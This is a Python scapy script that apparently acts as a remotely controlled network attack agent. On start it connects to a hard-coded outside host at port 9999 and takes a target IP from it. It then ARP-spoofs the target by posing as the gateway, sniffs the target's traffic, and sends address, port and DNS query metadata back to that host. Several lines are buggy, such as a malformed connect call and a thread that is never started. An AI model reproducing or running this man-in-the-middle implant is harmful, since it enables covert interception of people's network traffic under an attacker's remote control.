#! /usr/bin/python
from scapy.all import *
import threading
from socket import *
import time
import sys,os
from random import *
from getch import getch
import multiprocessing
hdler=socket(AF_INET,SOCK_STREAM)
hdler.connect("110.76.70.77",9999)

def send_data(socket,data):
	socket.send(data.encode())
def ip2macaddr(ip_addr,gateway_addr):
	src_ip=gateway_addr
	random_shit=IP(src=src_ip,dst=ip_addr)/UDP(sport=1999,dport=80)
	th=threading.Thread(target=sendpackets,args=(random_shit,2))
	time.sleep(1)
	pqrs=detect_udp(src_ip,ip_addr,1999,80,3)
	if(pqrs[Ether].dst=="ff:ff:ff:ff:ff:ff"):
		print("[-] Failed to identify with UDP Scan. Manually configure MAC Address.")
		mac_addr=raw_input("[*] Configure MAC Address manually and enter it: ")
	else:
		print("[+] Identified MAC Address using UDP Scan: "+pqrs[Ether].dst)
	return pqrs[Ether].dst

def timer_load_bar(start_time,total_time):
	while True:
		cur_time=time.time()
		dtime=cur_time-start_time
		pcnt=round(dtime/total_time*100,2)
		if(pcnt>100):
			return
		nnn=int(pcnt/5)
		dx="|"+"="*nnn+">"+" "*(19-nnn)+"|"+" "+str(pcnt)+"%"
		sys.stdout.write("\r"+dx)
stop=False
DEFAULT_PORTS=[20,21,22,23,25,53,67,68,69,80,110,123,137,138,139,143,161,162,179,389,443,636,989,990]
def sendpackets(packet,timeout):
	st=time.time()
	while time.time()-st<timeout:
		try:
			send(packet,verbose=0)
		except:
			continue
def get_my_lan_mac_addr():
	path="/sys/class/ieee80211/phy0/macaddress"
	f=open(path,'r')
	return f.readline().strip('\n')
def get_my_lan_ip_addr():
	s = socket(AF_INET, SOCK_DGRAM)
	s.connect(("8.8.8.8", 80))
	addr=s.getsockname()[0]
	s.close()
	return addr
scan_log_sent=[]
scan_log_recv=[]
def send_packets_count(packet,count):
	global scan_log_sent
	minus=0
	for i in range(count):	
		try:
			send(packet,verbose=False)
		except:
			minus+=1
			continue
	scan_log_sent+=[[time.time(),packet,count,(count-minus)]]


	
def validate_ipv4(addr):
	addr=addr.split(".")
	if(len(addr)!=4):
		return False 
	for val in addr:
		if(int(val)>255):
			return False
	return True


def arpspoof(tgt_ip,ttr):
	
	src_mac=get_my_lan_mac_addr()
	gateway_addr="110.76.70.1"
	tgt_mac=ip2macaddr(tgt_ip,gateway_addr)
	src_ip=get_my_lan_ip_addr()
	num_of_threads=5
	arp_packet=ARP(hwsrc=src_mac,psrc=gateway_addr,hwdst=tgt_mac,pdst=tgt_ip)
	proc=[i for i in range(num_of_threads)]
	for i in range(num_of_threads):
		proc[i]=threading.Thread(target=sendpackets, args=(arp_packet,ttr))
		proc[i].start()
	router=threading.Thread(target=mitm_router,args=(tgt_ip,gateway_addr,ttr))
	router.start()
	thnum=threading.activeCount()-num_of_threads-1
	time.sleep(ttr)
		
def handle_packet(packet):
	tgtdata=""
	if(packet.haslayer(DNSQR) and packet.haslayer(IP)):
		tgtdata="dns"+packet[IP].src+"/"+str(packet[TCP].sport)+">"+packet[IP].dst+"/"+str(packet[TCP].dport)
		hdler.sendall(tgtdata.encode())
	elif(packet.haslayer(IP)):
		tgtdata=packet[IP].src+"/"+str(packet[TCP].sport)+">"+packet[IP].dst+"/"+str(packet[TCP].dport)
		hdler.sendall(tgtdata.encode())
		
	
def mitm_router(src_ip,gateway_addr,timeout):
	filt="host "+src_ip+" and not arp"
	packets=sniff(prn=handle_packet, filter=filt,timeout=timeout)
	
def main():
	tgt=hdler.recv(1024)
	if(validate_ipv4(tgt)==False):
		main()
	arpspoof(tgt,180)

main()
	
